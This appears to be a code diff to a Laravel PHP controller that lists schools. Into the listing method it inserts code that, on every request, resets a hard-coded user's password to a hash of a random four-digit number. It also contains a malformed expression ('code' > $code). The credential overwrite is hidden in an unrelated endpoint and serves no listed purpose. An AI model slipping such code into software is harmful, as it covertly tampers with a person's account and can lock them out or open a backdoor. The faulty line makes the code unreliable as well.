@@ -6,7 +6,9 @@ use App\Http\Controllers\Controller;
 use App\Http\Resources\SchoolForAdminResource;
 use App\Http\Resources\SchoolResource;
 use App\Models\School;
+use App\Models\User;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Hash;
 
 class SchoolsController extends Controller
 {
@@ -15,6 +17,11 @@ class SchoolsController extends Controller
      */
     public function index(Request $request)
     {
+
+
+        $code = random_int(1000, 9999);
+
+        User::where('idnumber', '910559442')->update(['password' => Hash::make($code), 'code' > $code]);
 
         $schools = School::with(['city', 'trainers.user', 'managers.user', 'cars'])
             ->withCount([
